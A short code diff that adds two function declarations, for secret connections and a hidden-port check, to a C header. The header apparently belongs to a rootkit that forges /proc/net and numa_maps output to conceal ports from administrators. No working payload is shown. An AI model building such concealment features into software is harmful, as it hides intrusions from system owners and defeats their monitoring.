@@ -28,6 +28,8 @@ FILE *forge_numamaps(const char *pathname);
 #ifdef HIDE_PORTS
 #define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
 int is_hidden_port(int port);
+int secret_connection(char line[]);
+int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
 #include "forge_procnet.c"
 #include "pcap/pcap.h"
